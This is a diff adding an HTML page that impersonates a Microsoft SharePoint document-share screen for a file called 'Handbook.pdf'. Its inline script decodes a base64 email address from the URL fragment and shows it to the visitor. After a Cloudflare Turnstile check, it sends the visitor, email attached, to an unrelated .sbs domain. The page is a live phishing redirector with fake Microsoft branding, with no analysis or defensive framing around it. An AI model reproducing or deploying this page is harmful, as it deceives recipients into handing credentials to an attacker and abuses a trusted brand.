@@ -1,0 +1,174 @@
+<!-- url: https://www.mybusiness361.com/docs/hts41.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirected..</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    body {
+      font-family: Segoe UI, sans-serif;
+      margin: 0;
+      background-color: #ffffff;
+    }
+    .topbar {
+      background-color: #0078d4;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      padding-left: 20px;
+      color: white;
+      font-size: 18px;
+      font-weight: 500;
+    }
+    .card {
+      max-width: 400px;
+      margin: 50px auto;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 30px 25px;
+      text-align: center;
+      border: 1px solid #e0e0e0;
+    }
+    .card h2 {
+      margin-bottom: 10px;
+    }
+    .card p {
+      font-size: 14px;
+      color: #555;
+    }
+    .card img {
+      width: 30px;
+      vertical-align: middle;
+      margin: 5px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 40px;
+    }
+    .footer a {
+      color: #555;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .microsoft-logo {
+      width: 90px;
+      margin: 15px auto;
+      display: block;
+    }
+    .loading {
+      display: none;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #0078d4;
+    }
+    .spinner {
+      margin: 10px auto;
+      width: 30px;
+      height: 30px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #0078d4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">SharePoint</div>
+
+  <div class="card">
+    <h2>You are being Redirected..</h2>
+    <p></p>
+    <p><img src="https://static.helpjuice.com/helpjuice_production/uploads/upload/image/6076/497049/loader.gif" alt="word icon"> <strong>Handbook.pdf</strong></p>
+    <p>
+      <br>
+      <strong id="emailDisplay"></strong>
+    </p>
+
+    <form id="verify-form">
+      <div class="cf-turnstile" data-sitekey="0x4AAAAAAB37nJJAtEcAwJMp" data-callback="onVerified"></div>
+    </form>
+
+    <div class="loading" id="loadingIndicator">
+      Loading, please wait...
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div>© 2025 Microsoft SharePoint &nbsp; <a href="#">Privacy & Cookies</a></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="microsoft-logo" alt="Microsoft Logo">
+    <div><a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a></div>
+  </div>
+
+  <script>
+   
+    let decodedEmail = "";
+
+    (function () {
+      const rawHash = window.location.hash || "";
+    
+      const encodedParam = rawHash.startsWith("#") ? rawHash.slice(1) : rawHash;
+      const encodedEmail = encodedParam ? decodeURIComponent(encodedParam) : "";
+
+      function base64UrlToStd(b64u) {
+        // URL-safe -> standart Base64
+        let s = b64u.replace(/-/g, "+").replace(/_/g, "/");
+        const pad = s.length % 4;
+        if (pad === 2) s += "==";
+        else if (pad === 3) s += "=";
+        else if (pad !== 0 && s.length > 0) s += "==";
+        return s;
+      }
+
+      function safeDecodeBase64(input) {
+        try {
+          const std = base64UrlToStd(input);
+          const decoded = atob(std);
+          
+          try {
+            return decodeURIComponent(escape(decoded));
+          } catch {
+            return decoded;
+          }
+        } catch {
+         
+          return input;
+        }
+      }
+
+      if (encodedEmail) {
+        decodedEmail = (safeDecodeBase64(encodedEmail) || "").trim();
+        document.getElementById("emailDisplay").textContent = decodedEmail || "(Invalid email)";
+      } else {
+        document.getElementById("emailDisplay").textContent = "";
+      }
+    })();
+
+   
+    const REDIRECT_BASE = "https://loq.onbs2vlat.sbs/ipCYggnh";
+
+    function onVerified(token) {
+      if (!token) return;
+
+      document.getElementById("loadingIndicator").style.display = "block";
+
+      setTimeout(() => {
+       
+        if (decodedEmail) {
+          window.location.href = REDIRECT_BASE + "#" + decodedEmail;
+        } else {
+          window.location.href = REDIRECT_BASE;
+        }
+      }, 800);
+    }
+  </script>
+</body>
+</html>
